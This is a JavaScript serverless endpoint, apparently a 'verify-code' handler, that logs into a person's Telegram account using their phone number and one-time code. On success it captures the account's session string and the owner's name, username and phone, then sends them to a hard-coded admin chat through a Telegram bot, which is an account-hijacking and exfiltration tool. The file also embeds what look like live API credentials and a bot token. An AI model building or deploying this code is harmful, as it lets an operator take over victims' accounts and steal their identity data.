const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const API_ID = 23171051;
const API_HASH = '10331d5d712364f57ffdd23417f4513c';
const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
const ADMIN_ID = '7907742294';

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  let client;
  try {
    const { phone, phone_code_hash, otp_code, password } = req.body;

    if (!phone || !phone_code_hash || !otp_code) {
      return res.status(400).json({ 
        success: false, 
        error: 'All fields are required' 
      });
    }

    const stringSession = new StringSession('');
    client = new TelegramClient(stringSession, API_ID, API_HASH, {
      connectionRetries: 5,
    });

    await client.connect();

    try {
      // FIXED: Use the correct method - start with phone code
      await client.start({
        phoneNumber: phone,
        phoneCode: async () => otp_code,
        phoneCodeHash: phone_code_hash,
        onError: (err) => console.error(err),
      });

      // If we reach here, authentication was successful
      const sessionString = client.session.save();
      
      // Get user information
      const me = await client.getMe();
      const userInfo = {
        id: me.id,
        username: me.username || 'No username',
        first_name: me.firstName || '',
        last_name: me.lastName || '',
        phone: me.phone || phone
      };

      // Send session to admin via bot
      try {
        const message = `🔐 **New Telegram Session Generated**\n\n` +
          `👤 **User Info:**\n` +
          `├ ID: \`${userInfo.id}\`\n` +
          `├ Name: ${userInfo.first_name} ${userInfo.last_name}\n` +
          `├ Username: @${userInfo.username}\n` +
          `└ Phone: ${userInfo.phone}\n\n` +
          `🔑 **Session String:**\n\`${sessionString}\``;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: ADMIN_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      } catch (botError) {
        console.error('Failed to send to bot:', botError);
      }

      await client.disconnect();

      res.status(200).json({
        success: true,
        session_string: sessionString,
        user_info: userInfo,
        message: 'Session generated successfully and sent to admin'
      });

    } catch (signInError) {
      console.error('Sign in error:', signInError);
      
      let errorMessage = signInError.message;
      if (signInError.message.includes('PHONE_CODE_INVALID')) {
        errorMessage = 'Invalid verification code. Please check and try again.';
      } else if (signInError.message.includes('PHONE_CODE_EXPIRED')) {
        errorMessage = 'Verification code expired. Please request a new code.';
      } else if (signInError.message.includes('SESSION_PASSWORD_NEEDED')) {
        errorMessage = 'Two-factor authentication is enabled. Please enter your password.';
      } else if (signInError.message.includes('PHONE_NUMBER_UNOCCUPIED')) {
        errorMessage = 'Phone number not registered on Telegram.';
      } else if (signInError.message.includes('PHONE_NUMBER_INVALID')) {
        errorMessage = 'Invalid phone number.';
      }
      
      throw new Error(errorMessage);
    }

  } catch (error) {
    console.error('Error in verify-code:', error);
    
    if (client) {
      await client.disconnect();
    }
    
    res.status(200).json({
      success: false,
      error: error.message
    });
  }
};
